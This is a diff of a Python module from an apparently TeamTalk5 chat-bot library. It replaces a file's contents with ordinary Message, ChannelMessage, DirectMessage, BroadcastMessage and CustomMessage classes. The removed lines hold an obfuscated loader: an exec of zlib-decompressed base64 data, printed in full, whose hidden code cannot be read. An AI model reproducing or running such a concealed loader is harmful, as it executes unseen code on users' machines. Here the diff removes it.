@@ -1,2 +1,140 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'eJzdWMFu4zYQvfsrps5hpYVX2EuBwkAKuEkXCIoAi2320JNAS7RNWBINkoqrLPLvnZFImpJtxZtLiuRkSTOPM29mHslMp9OHjdBQyrwuOGSyMkxUGsyGwz3Xmq3xZcG0BlblIIwGXS/bF1wn0+l0MlkpWUIiyl3BS47eRsgqeeCsfGDF9msD+EUqA+7Nr8AQI99OJpMO164ynwD+IeI3vlNcIxIuGXiVnVkCbbidq97IusihkgaWHDBswyojmOE55ELxzBRNFyNB53wFaSoqYdI00rxYzcAgukH0tHPN+AxKvY67UGw4d+ggWCGeOMXjKHEOycTbLtRaHzzp7wh+DovKu4Jcwa6h756tO48awmBIc8yaewrC8Pxvyig5WhGuj6MYuDQ7ssJFkuperx/wsW9A9U1F7my+4ON3zdXd7QBHBkYP8pQJNRfW1RrpJ0umN7oCsQJnJIjuZWM4MKVYM8P6ZTJH5o23R2uhXVZRuMSs9dRxvx6DIMLHpEOPprVZffptGvcDrzEZ53BEZ7LmJiWLKKQrPjSd4ruisR3n4/v4cbtn2DH9ZsPeLwQ2mpHtAPqCextqgxYP9qIoqOtpUpz9rmBY8v2GKx76w55GjuwouEP73HNWiWqNpswQmSddEJpBtmFVxYtZa3J+fWt2WOFuDJQ4ewmRbA5wC5KgY0jsEyVZnjFt3PuXcBH2EWvadx4dZlu5bhJdE8lVv06hg6vwHP7izV6qHBt5XZNE6gT+5vzs8GOceeryW0mF2qxIcfBn2anrIc5v3NSqGoQaaAXc3bogWzJCVyZQw/ueX7kqhda4xp9KSTV3BaSQkK5ccl19MLBhjxi+tyVSyeI0F6FI4dzTHOWU9b/Gzn8Uh9+9CvmBCxVpIEHnh1LXGB+N5n3TmQ5W0U8OpWIlvxhnkWWyrkwUI4Bz7usX4ZB42VnoNWRlOxL5sp9HtGwGN52NpWkgZnap8ZAtAmUPv1wHQt3Hsni0j57BFDpleSmqKD72pD9FzTRsn2j6j6yxacZaxtKDc5gpqT1teLaIewu1hffpQJjLKId/uOE+zWJbsj3tMVgcTL9Nkl5keJLA0LFqQg95fyVPr+boSN1Os+M2XSTn8zh3h8/INJ+PQoWb2mCC3GGom2hjtFGRVcb+sC3vScGu4QvD5fwX1WrXOSbTUAYjRAn2zMPeinyXXalj+PQ7LKUsehvqzYZnW312c1s27fulNC9qqqr5BTCzLkdsJdyE91jv0zoYpu7PVz+lZcGRFmm3J9qWA3wcnCnadHCjwy+03St3wG43k6M9bJyHxYUoI1mvpnbn+0HS3gWepClJaZo+R5aP6x8hO8+on/Lwtv397I9T9q19eo7xxD+5gpJt+eHs4qvm7i/2+tEX2agvE8PriMcYnoze+FrST+JNbyewY02BenXmlkKtHFG5bcZnch25W3ghG1wuutcXG46f561RNICO/a31ti3ka7umPda+bcv0EnjfHXN0G71ySo42WAJt6Ibw2R7RhPlA/OyUeET+fZD24oAaH543wsVwXz1x33SRnOyzUNBtYw0PLD/dW93V5o27a5jFe2gwV6GbWhtZXlaerLX9n/zzqhf4e6jIf5KtfP8=')))
+"""This module contains the Message class and its subclasses."""
+
+from .implementation.TeamTalkPy import TeamTalk5 as sdk
+
+
+class Message:
+    """Represents a TeamTalk5 message. This class should not be instantiated directly."""
+
+    def __init__(self, teamtalk_instance, msg):
+        """Initializes a Message instance.
+
+        Args:
+            teamtalk_instance: An instance of pytalk.TeamTalkInstance.
+            msg: The message.
+        """
+        self.teamtalk_instance = teamtalk_instance
+        self.type = msg.nMsgType
+        self.from_id = msg.nFromUserID
+        self.to_id = msg.nToUserID
+        self.content = msg.szMessage
+        # if content is a byte array, decode it
+        if isinstance(self.content, bytes):
+            self.content = self.content.decode("utf-8")
+        self.user = self.teamtalk_instance.get_user(self.from_id)
+
+    def reply(self, content, **kwargs):
+        """Replies to the message.
+
+        The reply will be sent to the place where the message was sent from.
+        Meaning that if the message was sent to a channel, the reply will be sent to the channel.
+        If the message was sent to a user, the reply will be sent to the user.
+        And if the message was a broadcast message, the reply will be sent to the server as a broadcast.
+
+        Args:
+            content: The content of the message.
+            **kwargs: Keyword arguments. See pytalk.TeamTalkInstance.send_message for more information.
+
+        Returns:
+            The message ID of the reply.
+
+        Raises:
+            PermissionError: If the sender doesn't have permission to send the message.
+        """
+        msg = sdk.TextMessage()
+        msg.nMsgType = self.type
+        msg.nFromUserID = self.teamtalk_instance.super.getMyUserID()
+        msg.szFromUsername = self.teamtalk_instance.super.getMyUserAccount().szUsername
+        # if self is channel message, then reply to channel
+        if isinstance(self, ChannelMessage):
+            if self.teamtalk_instance.super.getMyChannelID() != self.to_id:
+                if not self.teamtalk_instance.is_admin():
+                    raise PermissionError("You don't have permission to send messages across channels.")
+            msg.nChannelID = self.to_id
+        if isinstance(self, BroadcastMessage):
+            # if we aren ot admin we cant do this
+            if not self.teamtalk_instance.is_admin():
+                raise PermissionError("You don't have permission to send broadcast messages.")
+            msg.nToUserID = 0
+            msg.nChannelID = 0
+        else:
+            msg.nToUserID = self.from_id
+        msg.szMessage = sdk.ttstr(content)
+        msg.bMore = False
+        return self.teamtalk_instance._send_message(msg, **kwargs)
+
+    def is_me(self) -> bool:
+        """Checks if the message was sent by the bot.
+
+        Returns:
+            True if the message was sent by the bot, False otherwise.
+        """
+        return self.from_id == self.teamtalk_instance.super.getMyUserID()
+
+    def __str__(self) -> str:
+        """Returns a string representation of the message.
+
+        Returns:
+            A string representation of the message.
+        """
+        return f"pytalk.{type(self).__name__}(from_id={self.from_id}, to_id={self.to_id}, content={self.content})"
+
+
+# make a channel message subclass
+class ChannelMessage(Message):
+    """Represents a message sent to a channel. This class should not be instantiated directly."""
+
+    def __init__(self, teamtalk_instance, msg):
+        """Initializes a ChannelMessage instance.
+
+        Args:
+            teamtalk_instance: An instance of pytalk.TeamTalkInstance.
+            msg: The message payload.
+        """
+        super().__init__(teamtalk_instance, msg)
+        self.to_id = msg.nChannelID
+        self.channel_id = msg.nChannelID
+        self.channel = self.teamtalk_instance.get_channel(self.channel_id)
+
+
+class DirectMessage(Message):
+    """Represents a message sent to a user. This class should not be instantiated directly."""
+
+    def __init__(self, teamtalk_instance, msg):
+        """Initializes a DirectMessage instance.
+
+        Args:
+            teamtalk_instance: An instance of pytalk.TeamTalkInstance.
+            msg: The message payload.
+        """
+        super().__init__(teamtalk_instance, msg)
+        self.to_id = msg.nToUserID
+        # if the id is still 0, then it's a private message to the bot
+        if self.to_id == 0:
+            self.to_id = teamtalk_instance.getMyUserID()
+
+
+class BroadcastMessage(Message):
+    """Represents a message sent to a server. This class should not be instantiated directly."""
+
+    def __init__(self, teamtalk_instance, msg):
+        """Initializes a BroadcastMessage instance.
+
+        Args:
+            teamtalk_instance: An instance of pytalk.TeamTalkInstance.
+            msg: The message payload.
+        """
+        super().__init__(teamtalk_instance, msg)
+
+
+class CustomMessage(Message):
+    """Represents a custom message. This class should not be instantiated directly."""
+
+    def __init__(self, teamtalk_instance, msg):
+        """Initializes a CustomMessage instance.
+
+        Args:
+            teamtalk_instance: An instance of pytalk.TeamTalkInstance.
+            msg: The message payload.
+        """
+        super().__init__(teamtalk_instance, msg)
